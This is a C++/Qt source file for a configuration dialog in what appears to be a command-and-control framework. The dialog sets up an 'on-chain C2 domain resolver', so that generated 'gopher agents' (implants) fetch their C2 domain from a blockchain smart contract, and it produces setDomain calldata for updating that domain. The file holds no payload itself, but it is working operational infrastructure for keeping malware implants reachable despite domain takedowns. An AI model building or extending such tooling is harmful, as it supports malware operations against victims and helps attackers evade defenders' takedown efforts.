#include <UI/Dialogs/DialogChain.h>
#include <Client/AuthProfile.h>
#include <Client/Requestor.h>
#include <QPointer>
#include <QUrl>

static bool isValidChainHost(const QString &host)
{
    if (host.isEmpty() || host.size() > 253)
        return false;
    if (host.startsWith('.') || host.startsWith('-') || host.endsWith('.') || host.endsWith('-'))
        return false;

    for (const QChar ch : host) {
        const ushort c = ch.unicode();
        if (c < 0x21 || c > 0x7e)
            return false;
        if (ch == '/' || ch == ':' || ch == '\\')
            return false;
    }
    return true;
}

static bool isValidContractAddress(const QString &address)
{
    if (address.size() != 42 || !address.startsWith("0x", Qt::CaseInsensitive))
        return false;

    for (int i = 2; i < address.size(); ++i) {
        const QChar ch = address.at(i);
        if (!((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f') || (ch >= 'A' && ch <= 'F')))
            return false;
    }
    return true;
}

DialogChain::DialogChain(AuthProfile* authProfile, QWidget* parent) : QWidget(parent), profile(authProfile)
{
    createUI();

    connect(saveButton,     &QPushButton::clicked, this, &DialogChain::onSave);
    connect(refreshButton,  &QPushButton::clicked, this, &DialogChain::onRefreshStatus);
    connect(calldataButton, &QPushButton::clicked, this, &DialogChain::onCopyCalldata);
    connect(closeButton,    &QPushButton::clicked, this, &QWidget::close);

    if (!profile) {
        setBusy(false);
        setStatus("No active project.", true);
        return;
    }

    setBusy(true);
    QPointer<DialogChain> safeThis = this;
    HttpReqChainConfigGetAsync(*profile, [safeThis](bool success, const QString &message, const QJsonObject &response) {
        if (!safeThis)
            return;

        safeThis->setBusy(false);
        if (!success || !response.value("ok").toBool()) {
            const QString error = response.value("message").toString(message);
            safeThis->setStatus(error.isEmpty() ? "Failed to load chain config." : error, true);
            return;
        }

        safeThis->applyConfig(response.value("config").toObject());
        safeThis->setStatus("Configuration loaded.", false);
    });
}

DialogChain::~DialogChain() = default;

void DialogChain::createUI()
{
    this->setWindowTitle("C2 Domain / Chain");
    this->resize(760, 380);
    this->setProperty("Main", "base");

    auto* title = new QLabel("On-chain C2 domain resolver", this);
    QFont titleFont = title->font();
    titleFont.setBold(true);
    title->setFont(titleFont);

    enabledCheck = new QCheckBox("Enable chain resolution for newly generated gopher agents", this);

    domainEdit = new QLineEdit(this);
    domainEdit->setPlaceholderText("tcp.example.com");

    rpcEdit = new QLineEdit(this);
    rpcEdit->setPlaceholderText("https://data-seed-prebsc-1-s1.bnbchain.org:8545");

    contractEdit = new QLineEdit(this);
    contractEdit->setPlaceholderText("0x...");

    chainIdSpin = new QSpinBox(this);
    chainIdSpin->setRange(1, 2147483647);
    chainIdSpin->setValue(97);

    pollSpin = new QSpinBox(this);
    pollSpin->setRange(15, 86400);
    pollSpin->setValue(60);
    pollSpin->setSuffix(" s");

    statusLabel = new QLabel("Loading...", this);
    statusLabel->setWordWrap(true);
    statusLabel->setTextInteractionFlags(Qt::TextSelectableByMouse);

    saveButton     = new QPushButton("Save", this);
    refreshButton  = new QPushButton("Refresh status", this);
    calldataButton = new QPushButton("Copy setDomain calldata", this);
    closeButton    = new QPushButton("Close", this);

    auto* layout = new QGridLayout(this);
    layout->setContentsMargins(10, 10, 10, 10);
    layout->setHorizontalSpacing(8);
    layout->setVerticalSpacing(8);
    layout->setColumnStretch(1, 1);

    int row = 0;
    layout->addWidget(title, 0, 0, 1, 2);
    row++;

    layout->addWidget(enabledCheck, row, 0, 1, 2);
    row++;

    auto addRow = [this, layout, &row](const QString &label, QWidget* widget) {
        layout->addWidget(new QLabel(label, this), row, 0);
        layout->addWidget(widget, row, 1);
        row++;
    };

    addRow("Domain (host only)", domainEdit);
    addRow("RPC URL", rpcEdit);
    addRow("Chain ID", chainIdSpin);
    addRow("Contract", contractEdit);
    addRow("Poll interval", pollSpin);

    layout->addWidget(statusLabel, row, 0, 1, 2);
    row++;

    layout->addWidget(saveButton,     row, 0);
    layout->addWidget(refreshButton,  row, 1);
    row++;
    layout->addWidget(calldataButton, row, 0);
    layout->addWidget(closeButton,    row, 1);

    this->setLayout(layout);
}

void DialogChain::setBusy(bool busy)
{
    saveButton->setEnabled(!busy);
    refreshButton->setEnabled(!busy);
    calldataButton->setEnabled(!busy);
}

void DialogChain::setStatus(const QString &text, bool error)
{
    statusLabel->setText(text);
    statusLabel->setStyleSheet(error ? "color:#e05a5a;" : "color:#5fd08a;");
}

void DialogChain::applyConfig(const QJsonObject &config)
{
    enabledCheck->setChecked(config.value("enabled").toBool());
    domainEdit->setText(config.value("domain").toString());
    rpcEdit->setText(config.value("rpc").toString());
    contractEdit->setText(config.value("contract").toString());

    const int chainId = config.value("chain_id").toInt(97);
    if (chainId > 0)
        chainIdSpin->setValue(chainId);

    const int poll = config.value("poll_seconds").toInt(60);
    pollSpin->setValue(qBound(15, poll, 86400));
}

QJsonObject DialogChain::currentConfig() const
{
    QJsonObject cfg;
    cfg["enabled"]      = enabledCheck->isChecked();
    cfg["domain"]       = domainEdit->text().trimmed();
    cfg["rpc"]          = rpcEdit->text().trimmed();
    cfg["chain_id"]     = chainIdSpin->value();
    cfg["contract"]     = contractEdit->text().trimmed();
    cfg["poll_seconds"] = pollSpin->value();
    return cfg;
}

bool DialogChain::validateInputs(QString &error) const
{
    const bool enabled = enabledCheck->isChecked();

    const QString domain = domainEdit->text().trimmed();
    if ((enabled || !domain.isEmpty()) && !isValidChainHost(domain)) {
        error = "Domain must be a host only: no scheme, path, port or whitespace.";
        return false;
    }

    const QString rpc = rpcEdit->text().trimmed();
    if (enabled || !rpc.isEmpty()) {
        const QUrl url(rpc);
        if (!url.isValid() || (url.scheme() != "http" && url.scheme() != "https") || url.host().isEmpty()) {
            error = "RPC must be a valid http(s) URL.";
            return false;
        }
    }

    const QString contract = contractEdit->text().trimmed();
    if ((enabled || !contract.isEmpty()) && !isValidContractAddress(contract)) {
        error = "Contract must be a 0x-prefixed 20-byte address.";
        return false;
    }

    if (enabled && chainIdSpin->value() <= 0) {
        error = "Chain ID must be positive.";
        return false;
    }

    return true;
}

void DialogChain::onSave()
{
    if (!profile)
        return;

    QString error;
    if (!validateInputs(error)) {
        MessageError(error);
        return;
    }

    setBusy(true);
    QPointer<DialogChain> safeThis = this;
    HttpReqChainConfigSetAsync(currentConfig(), *profile,
        [safeThis](bool success, const QString &message, const QJsonObject &response) {
            if (!safeThis)
                return;

            safeThis->setBusy(false);
            if (!success || !response.value("ok").toBool()) {
                const QString err = response.value("message").toString(message);
                safeThis->setStatus(err.isEmpty() ? "Failed to save chain config." : err, true);
                return;
            }

            safeThis->applyConfig(response.value("config").toObject());
            safeThis->setStatus("Configuration saved. Generate new agents to apply the build-time flag.", false);
        });
}

void DialogChain::onRefreshStatus()
{
    if (!profile)
        return;

    setBusy(true);
    QPointer<DialogChain> safeThis = this;
    HttpReqChainStatusAsync(*profile, [safeThis](bool success, const QString &message, const QJsonObject &response) {
        if (!safeThis)
            return;

        safeThis->setBusy(false);
        if (!success || !response.value("ok").toBool()) {
            const QString err = response.value("message").toString(message);
            safeThis->setStatus(err.isEmpty() ? "Failed to read on-chain status." : err, true);
            return;
        }

        const QJsonObject status = response.value("status").toObject();
        const qint64 updatedAt = status.value("updated_at").toVariant().toLongLong();
        const QString updated = updatedAt > 0
            ? QDateTime::fromSecsSinceEpoch(updatedAt).toString("yyyy-MM-dd HH:mm:ss")
            : QString("never");

        safeThis->setStatus(
            QString("On-chain domain: %1 | enabled: %2 | version: %3 | updated: %4")
                .arg(status.value("domain").toString())
                .arg(status.value("enabled").toBool() ? "true" : "false")
                .arg(status.value("version").toVariant().toULongLong())
                .arg(updated),
            false);
    });
}

void DialogChain::onCopyCalldata()
{
    if (!profile)
        return;

    const QString domain = domainEdit->text().trimmed();
    if (!isValidChainHost(domain)) {
        MessageError("Enter a valid host-only domain first.");
        return;
    }

    setBusy(true);
    QPointer<DialogChain> safeThis = this;
    HttpReqChainCalldataAsync(domain, *profile,
        [safeThis](bool success, const QString &message, const QJsonObject &response) {
            if (!safeThis)
                return;

            safeThis->setBusy(false);
            if (!success || !response.value("ok").toBool()) {
                const QString err = response.value("message").toString(message);
                safeThis->setStatus(err.isEmpty() ? "Failed to build calldata." : err, true);
                return;
            }

            const QString calldata = response.value("calldata").toString();
            QApplication::clipboard()->setText(calldata);
            safeThis->setStatus("setDomain calldata copied to clipboard:\n" + calldata, false);
        });
}
